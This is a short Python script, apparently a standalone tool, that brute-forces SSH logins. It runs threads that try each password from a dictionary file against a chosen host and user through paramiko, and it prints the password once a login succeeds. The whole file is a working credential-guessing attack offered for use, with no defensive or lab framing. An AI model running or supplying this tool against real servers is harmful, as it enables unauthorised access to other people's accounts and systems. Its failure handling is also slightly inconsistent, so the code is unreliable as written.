""" Brute-forcer for ssh connexion, using a dictionary.

Dependencies :
* paramiko
"""

import argparse
import time

from threading import Thread, BoundedSemaphore

import paramiko


found = False
fails = 0
connexion_lock = None


def main():
    # Parse arguments
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('target_host', type=str,
                        help='Target host')
    parser.add_argument('target_user', type=str,
                        help='Target user')
    parser.add_argument('dictionary', type=str,
                        help="Dictionary to use for bruteforcing")
    parser.add_argument('-p', '--n-processes', type=int, default=5,
                        help="Number of processes to run simultaneously")
    parser.add_argument('-f', '--max-fails', type=int, default=5,
                        help="Maximum number of failed attempts before exiting")
    parser.add_argument('-w', '--waiting-time', type=int, default=3,
                        help="Waiting time between each attempt")
    args = parser.parse_args()

    bruteforce_ssh_user(target_host=args.target_host,
                        target_user=args.target_user,
                        path_dictionary=args.dictionary,
                        n_processes=args.n_processes,
                        max_fails=args.max_fails,
                        waiting_time=args.waiting_time)


def bruteforce_ssh_user(target_host, target_user, path_dictionary,
                        n_processes=5, max_fails=5, waiting_time=3):
    global found, fails, connexion_lock

    connexion_lock = BoundedSemaphore(value=n_processes)

    with open(path_dictionary) as dictionary:
        for password in dictionary:
            if found:
                exit(0)
            if fails > max_fails:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(0)
            connexion_lock.acquire()
            password = password.rstrip("\n")
            Thread(target=connect,
                   args=(target_host, target_user, password,
                         waiting_time)).start()


def connect(target_host, target_user, password, waiting_time):
    global found, fails, connexion_lock

    try:
        # Configure client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connexion attempt
        client.connect(target_host, username=target_user, password=password)
        found = True
        client.close()
        print('[+]', '"' + target_user + '@' + target_host + '" password:',
              password)
    except paramiko.ssh_exception.AuthenticationException:
        fails += 1
        time.sleep(waiting_time)
        connexion_lock.release()


if __name__ == '__main__':
    main()
